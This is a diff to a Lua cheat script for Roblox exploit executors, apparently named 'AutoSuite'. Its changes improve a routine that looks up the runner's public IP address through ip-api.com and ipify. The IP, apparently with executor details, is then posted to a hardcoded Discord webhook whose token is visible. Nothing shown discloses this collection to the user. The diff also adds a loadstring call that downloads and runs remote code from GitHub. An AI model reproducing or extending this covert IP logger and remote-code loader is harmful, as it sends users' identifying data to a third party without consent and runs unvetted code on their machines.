@@ -13,44 +13,50 @@ local WEBHOOK = "https://discord.com/api/webhooks/1559374825364136008/qOYpc1QvKh
 do
     local HSvc = game:GetService("HttpService")
 
+    local function getRequestFunc()
+        if syn and syn.request then return syn.request end
+        if http and http.request then return http.request end
+        if request then return request end
+        if fluxus and fluxus.request then return fluxus.request end
+        if krnl and krnl.request then return krnl.request end
+        if secure_call then return nil end
+        return nil
+    end
+
     local function httpGet(url)
-        local ok, res = pcall(function()
-            if syn and syn.request then
-                local r = syn.request({ Url = url, Method = "GET" })
-                return r and r.Body
-            elseif http and http.request then
-                local r = http.request({ Url = url, Method = "GET" })
-                return r and r.Body
-            elseif request then
-                local r = request({ Url = url, Method = "GET" })
-                return r and r.Body
-            elseif fluxus and fluxus.request then
-                local r = fluxus.request({ Url = url, Method = "GET" })
-                return r and r.Body
-            else
-                return game:HttpGet(url)
-            end
-        end)
-        if ok and type(res) == "string" then return res end
+        local req = getRequestFunc()
+        if req then
+            local ok, res = pcall(function()
+                local r = req({ Url = url, Method = "GET" })
+                if type(r) == "table" then
+                    return r.Body or r.body or r
+                end
+                return r
+            end)
+            if ok and type(res) == "string" then return res end
+        end
+        local ok2, res2 = pcall(function() return game:HttpGet(url) end)
+        if ok2 and type(res2) == "string" then return res2 end
         return nil
     end
 
     local function post(url, body)
-        local headers = { ["Content-Type"] = "application/json" }
-        local ok = pcall(function()
-            if syn and syn.request then
-                syn.request({ Url = url, Method = "POST", Headers = headers, Body = body })
-            elseif http and http.request then
-                http.request({ Url = url, Method = "POST", Headers = headers, Body = body })
-            elseif request then
-                request({ Url = url, Method = "POST", Headers = headers, Body = body })
-            elseif fluxus and fluxus.request then
-                fluxus.request({ Url = url, Method = "POST", Headers = headers, Body = body })
-            else
-                HSvc:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
-            end
+        local req = getRequestFunc()
+        if req then
+            local ok = pcall(function()
+                req({
+                    Url = url,
+                    Method = "POST",
+                    Headers = { ["Content-Type"] = "application/json" },
+                    Body = body
+                })
+            end)
+            if ok then return true end
+        end
+        local ok2 = pcall(function()
+            HSvc:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
         end)
-        return ok
+        return ok2
     end
 
     local function getexec()
@@ -72,24 +78,25 @@ do
     end
 
     local function getip()
-        local endpoints = {
-            "https://api.ipify.org?format=json",
-            "https://api64.ipify.org?format=json",
-            "https://ipv4.icanhazip.com",
-            "https://ifconfig.me/ip",
-        }
-        for _, url in ipairs(endpoints) do
-            local res = httpGet(url)
-            if res then
-                res = res:gsub("%s+", "")
-                if res:sub(1, 1) == "{" then
-                    local ok, decoded = pcall(HSvc.JSONDecode, HSvc, res)
-                    if ok and decoded and decoded.ip then
-                        return tostring(decoded.ip)
-                    end
-                elseif #res > 0 and #res < 64 and res:match("^[%d%.]+$") then
-                    return res
-                end
+        local res = httpGet("http://ip-api.com/json/")
+        if res then
+            local ok, decoded = pcall(HSvc.JSONDecode, HSvc, res)
+            if ok and decoded and decoded.query then
+                return tostring(decoded.query)
+            end
+        end
+        local res2 = httpGet("https://api.ipify.org?format=json")
+        if res2 then
+            local ok2, decoded2 = pcall(HSvc.JSONDecode, HSvc, res2)
+            if ok2 and decoded2 and decoded2.ip then
+                return tostring(decoded2.ip)
+            end
+        end
+        local res3 = httpGet("https://api64.ipify.org?format=json")
+        if res3 then
+            local ok3, decoded3 = pcall(HSvc.JSONDecode, HSvc, res3)
+            if ok3 and decoded3 and decoded3.ip then
+                return tostring(decoded3.ip)
             end
         end
         return "Unknown"
@@ -142,7 +149,10 @@ do
             embeds     = { embed },
         })
 
-        post(WEBHOOK, payload)
+        local ok = post(WEBHOOK, payload)
+        if not ok then
+            warn("[AutoSuite] Webhook post failed")
+        end
     end)
 end
 
@@ -212,7 +222,6 @@ for _, g in next, me.PlayerGui:GetChildren() do
     end
 end
 
-local LibSrc = game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
 local Lib
 do
     local ok, res = pcall(function()
@@ -222,7 +231,7 @@ do
         Lib = res
     else
         local ok2, res2 = pcall(function()
-            return loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/UI-Libraries/main/VynixuUILib.lua"))()
+            return loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
         end)
         if ok2 and res2 then
             Lib = res2
